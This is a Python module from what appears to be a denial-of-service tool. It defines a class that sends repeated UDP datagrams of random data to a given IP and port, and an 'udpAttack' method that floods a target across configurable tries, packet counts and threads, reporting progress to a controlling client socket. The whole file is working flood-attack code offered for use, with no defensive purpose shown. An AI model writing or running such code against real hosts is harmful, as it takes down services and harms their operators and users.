from modules.functions import CLEAR

from numpy import random as nrand
from socket import socket, AF_INET, SOCK_DGRAM
from time import sleep
from threading import Thread

class Packets:
  def __init__(self) -> None:
    pass

  def udpPacket(self, ip: str, port: int, data: str, mult: int) -> None:
    try:
      s: socket = socket(AF_INET, SOCK_DGRAM)
      s.setblocking(True)
      for _ in range(mult):
        s.sendto(data.encode(), (ip, port))
    except Exception as e:
      pass #print(f"Fail: {e}")
    finally:
      s.close()

class Attacks:
  def __init__(self) -> None:
    self.packets: Packets = Packets()
  
  # ABSOLUTE AIDS
  def udpAttack(self, blacklisted: bool, client: socket, ip: str, port: int, tries: int, packets: int, repack: int,  trydelay: int, senddelay: int, size: int, threads: int) -> None:
    try:
      for x in range(tries):
        for y in range(packets):
          for z in range(threads):
            client.send(f"{CLEAR}\n".encode("utf-8"))
            try:
              if not blacklisted:
                packet = Thread(target=self.packets.udpPacket, args=(ip, port, '\n'.join([str(value) for value in nrand.rand(size)]), repack))
                packet.start()
                packet.join()
                attack: list[str, str, str, str, str] = [str(ip), str(port), str(x+1), str(y+1), str(z+1)]
                try:
                  client.send(f"Target: {attack[0]} : Port: {attack[1]}\nTries: {attack[2]} : Packets: {attack[3]} : Threads: {attack[4]}\nPacket Size: {size}".encode("utf-8"))
                except:
                  pass
              else:
                try:
                  client.send(f"Target IP has been BLACKLISTED!".encode("utf-8"))
                except:
                  pass
            except Exception as e:
              print(f"threadfail: {e}")
          sleep(senddelay / 1000)
        sleep(trydelay)
    except:
      pass
    finally:
      client.send("Stopped".encode("utf-8"))

if __name__ == "__main__":
  exit()